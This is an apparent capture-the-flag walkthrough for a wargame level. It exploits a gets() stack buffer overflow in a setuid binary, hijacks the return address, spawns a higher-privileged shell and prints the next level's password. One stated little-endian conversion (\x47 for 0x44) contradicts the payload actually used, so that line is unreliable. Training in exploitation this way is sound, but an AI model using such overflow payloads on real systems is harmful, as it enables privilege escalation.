##  Description

Again, the binary for this level is a setuid and setgid executable owned by the next level user (level2), which means that when we run this binary, it will execute with the privileges of level2 user.

Let's run the binary and see what it does.

```bash
level1@RainFall:~$ ./level1
dsa
```

The program starts a prompt and waits for our input before closing. Let's have a look inside with `gdb`.

```bash
level1@RainFall:~$ gdb -batch ./level1 -ex 'disassemble main'
Dump of assembler code for function main:
   0x08048480 <+0>:	    push   %ebp
   0x08048481 <+1>:	    mov    %esp,%ebp
   0x08048483 <+3>:	    and    $0xfffffff0,%esp
   0x08048486 <+6>:	    sub    $0x50,%esp
   0x08048489 <+9>:	    lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

This is a very short program, with an function call to `gets()`. The man page of `gets()` has very interesting things to tell us:

```
BUGS
       Never use gets().  Because it is impossible to tell without
       knowing the data in advance how many characters gets() will read,
       and because gets() will continue to store characters past the end
       of the buffer, it is extremely dangerous to use.  It has been used
       to break computer security.  Use fgets() instead.

       For more information, see CWE-242 (aka "Use of Inherently
       Dangerous Function") at
       http://cwe.mitre.org/data/definitions/242.html
```

In other words, `gets()` is unsafe because it does not check the length of the input, and if we provide more data than the allocated buffer can hold, it will overflow and overwrite adjacent memory. This is a classic buffer overflow vulnerability.

This is confirmed by the following test, where we input a long string of characters:

```bash
level1@RainFall:~$ ./level1 
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
Segmentation fault (core dumped)
```

But that is not all: if we run readelf on the binary, we can actually see a ghost function in the program, `run()`, that is never called under the normal execution flow:

```bash
level1@RainFall:~$ readelf -a ./level1 | grep FUNC
	...
    50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run
	...
```

And this is the corresponding disassembly:

```bash
level1@RainFall:~$ gdb -batch ./level1 -ex 'disas run'
Dump of assembler code for function run:
   0x08048444 <+0>:		push   %ebp
   0x08048445 <+1>:		mov    %esp,%ebp
   0x08048447 <+3>:		sub    $0x18,%esp
   0x0804844a <+6>:		mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
```

So if we can find a way to call this function, we should get a shell running with level2 privileges. But how?

We can rule out the possibility of moving the instruction pointer to `run()` manually using `gdb`, since the program would lose the elevated privileges granted by the setuid bit. Instead, we can exploit the buffer overflow vulnerability in `gets()` to overwrite the **return address** of `main()` to point to `run()`, effectively hijacking the program's control flow to execute our desired function.

When a function is called, the return address (the address to which the program should return after the function call) is stored on the stack. If we can overflow the buffer and overwrite this return address, we can redirect the program's execution to a location of our choosing; in this scenario, the `run()` function.

Let's have a look at the stack layout during the execution of `main()` using `gdb`:

```
HIGH addresses 0xffffffff
┌─────────────────┐
│ return address  │  ← what we need to overwrite
├─────────────────┤
│   saved EBP     │
├─────────────────┤  ← EBP points here at function entry
│   (padding)     │  ← area to store parameters before function call (12 bytes?)
├─────────────────┤
│   buf[63]       │  ← last byte of buffer (ESP+79)
│   buf[62]       │
│      ...        │
│   buf[1]        │
│   buf[0]        │  ← first byte of buffer (ESP+16)
└─────────────────┘  ← ESP points here after "sub $0x50,%esp"
LOW addresses 0x00000000
```

So we need to pass a payload to `gets()` that fills the buffer and overwrites the saved EBP with garbage value, and then overwrites the return address with the address of `run()`. This means at least 64 bytes for the buffer, then some padding, then the 4 bytes of the saved EBP, and finally the 4 bytes of the return address.

The winning payload should look like this:

> [64 bytes] + [x padding bytes] + [4 bytes EBP] + [Address of `run()`]

Now we need to determine the exact amount of padding needed to overflow the buffer and overwrite the return address. After a bit of trial and error, we find that the padding is 12 bytes long.

The exact address of `run()` can be found using gdb:

```bash
(gdb) b main
Breakpoint 1 at 0x8048483
(gdb) run
Starting program: /home/user/level1/level1 

Breakpoint 1, 0x08048483 in main ()
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Importantly, the address must be in hexadecimal and little-endian format, as the system architecture is little-endian. Thus, `0x08048444` becomes `\x47\x84\x04\x08`.

We can then create the final payload using Python:

```bash
level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We have successfully created the payload with Python, piped it into the vulnerable program, and opened a shell with level2 privileges which allowed us to read the password for the next level. This is a classical attack via a stack buffer overflow.

Note that the `cat` command is used to keep the input stream open after the payload is sent, allowing us to interact with the spawned shell; without it, the shell would close immediately after executing the payload.
